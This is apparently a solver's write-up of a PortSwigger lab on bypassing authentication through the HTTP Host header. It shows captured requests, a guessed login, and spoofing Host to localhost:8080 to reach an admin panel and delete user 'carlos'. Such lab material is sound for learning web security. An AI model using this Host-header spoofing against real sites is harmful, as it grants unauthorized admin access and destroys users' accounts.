# Host header authentication bypass

This lab makes an assumption about the privilege level of the user based on the HTTP `Host` header.

To solve the lab, access the admin panel and delete the user `carlos`.

---

## 1. Detection

- Accessed the lab and captured the initial request:

```http
GET / HTTP/2
Host: 0a1100d2036cb2fc81075c1200110007.web-security-academy.net
Cookie: session=QpNcP7pFA6ZJIys5I1RrB4ShaEMoEXaB; _lab=46%7cMCwCFHaxhoYdjYcQ8auJMlGTQG%2bfr7H3AhQlBERhopHeKzi7nlqJNJw3qI55ltYWmxfERmrniCUFzvZNfbjx90jjpm2iNX0%2fLsDR7QZ%2f59x7paqFgY%2btKW4kI94bZY%2bG95MwvFR%2bDA1O4U1Vb1NqzZhOzktxrnixYAy5hY4aRUFJ8ck%3d
Sec-Ch-Ua: "Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
```

- Nothing unusual here. Clicked `My account`, which led to a login page. Tried logging in as `carlos` (the user we ultimately want to delete) using a guessed default password, capturing the login request:

```http
POST /login HTTP/2
Host: 0a1100d2036cb2fc81075c1200110007.web-security-academy.net
Cookie: session=QpNcP7pFA6ZJIys5I1RrB4ShaEMoEXaB; _lab=46%7cMCwCFHaxhoYdjYcQ8auJMlGTQG%2bfr7H3AhQlBERhopHeKzi7nlqJNJw3qI55ltYWmxfERmrniCUFzvZNfbjx90jjpm2iNX0%2fLsDR7QZ%2f59x7paqFgY%2btKW4kI94bZY%2bG95MwvFR%2bDA1O4U1Vb1NqzZhOzktxrnixYAy5hY4aRUFJ8ck%3d
Content-Length: 71
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Origin: https://0a1100d2036cb2fc81075c1200110007.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a1100d2036cb2fc81075c1200110007.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i

csrf=YBLGUN96jkwBdmXB7hrdC5UcFMQCeOAl&username=carlos&password=password
```

- Got back:

```html
<p class=is-warning>Invalid username or password.</p>
```

- As expected, the credentials were wrong. Since the lab description explicitly calls out an assumption being made based on the `Host` header, started experimenting with that header instead of the credentials.

---

## 2. Manipulating the Host Header

- First tried changing the `Host` header from the lab's actual domain to `127.0.0.1:8080` — using the loopback address with port `8080` (a common default port for backend web apps) on the theory that the server might treat requests appearing to originate from itself as trusted/internal. No change in the response.
- Tried `localhost:8080` instead. This time, the response changed noticeably — an extra navigation link appeared that wasn't there before:

```html
<section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/admin">Admin panel</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
```

- An `Admin panel` link appeared, confirming the application grants elevated access based purely on the value of the `Host` header — specifically, it appears to treat requests with `Host: localhost:8080` as coming from a trusted internal/admin context.

---

## 3. Solve the Challenge

- Sent the request to Repeater and accessed the admin panel directly using the same poisoned `Host` header:

```http
GET /admin HTTP/2
Host: localhost:8080
```

- The response revealed the admin user management panel:

```html
<section>
                        <h1>Users</h1>
                        <div>
                            <span>wiener - </span>
                            <a href="/admin/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
                        </div>
                    </section>
```

> **Why this works:** The application determines whether a request is "from the admin panel" (and therefore privileged) by checking the `Host` header rather than verifying the user's actual session or role. Spoofing the `Host` header to `localhost:8080` — a value the backend associates with trusted, internal traffic — bypasses the access control entirely, since the check never validates anything about the authenticated user, only about which host the request claims to be addressed to.

- Modified the request path from `/admin` to `/admin/delete?username=carlos`, keeping the spoofed `Host: localhost:8080` header intact, and sent it:

```http
GET /admin/delete?username=carlos HTTP/2
Host: localhost:8080
```

- Got back:

```http
HTTP/2 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

- Followed the redirect back to `/admin`. The `is-solved` class was now applied to the relevant lab banner elements — PortSwigger's standard indicator that the lab has been solved.
- User `carlos` deleted. Lab solved.